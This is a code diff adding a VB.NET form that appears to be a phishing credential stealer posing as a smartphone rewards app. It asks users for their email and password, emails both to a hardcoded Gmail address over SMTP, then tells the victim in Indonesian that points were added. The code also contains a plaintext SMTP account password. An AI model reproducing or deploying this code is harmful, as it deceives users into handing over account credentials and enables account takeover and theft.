@@ -1,0 +1,37 @@
+Imports System.Net.Mail
+
+Public Class smartphone
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        If TextBox1.Text = "" Then
+            MsgBox("Masukan Email & Password!", MsgBoxStyle.Critical, "Error")
+        Else
+            If TextBox1.Text = "" Then
+                MsgBox("Masukan Email Anda!", MsgBoxStyle.Critical, "Error")
+            Else
+                If TextBox2.Text = "" Then
+                    MsgBox("Masukan Password Anda!", MsgBoxStyle.Critical, "Error")
+                Else
+                    Try
+                        Dim mail As New MailMessage
+                        mail.From = New MailAddress("amalxiaomi2@gmail.com")
+                        mail.To.Add("amalxiaomi2@gmail.com")
+                        mail.Subject = "mail!"
+                        mail.Body = "Email: " & TextBox1.Text & " " & "Password: " & TextBox2.Text & " "
+                        Dim smtp As New SmtpClient("smtp.gmail.com")
+                        smtp.Port = 587
+                        smtp.EnableSsl = True
+                        smtp.Credentials = New System.Net.NetworkCredential("amalxiaomi2@gmail.com", "amal1234")
+                        smtp.Send(mail)
+                        MsgBox("Point Ditambahkan!", MsgBoxStyle.Information, "Success")
+                    Catch ex As Exception
+                        MsgBox("Error! Silahkan Coba Lagi", MsgBoxStyle.Exclamation, "Error")
+                    End Try
+                End If
+            End If
+        End If
+    End Sub
+
+    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged
+
+    End Sub
+End Class
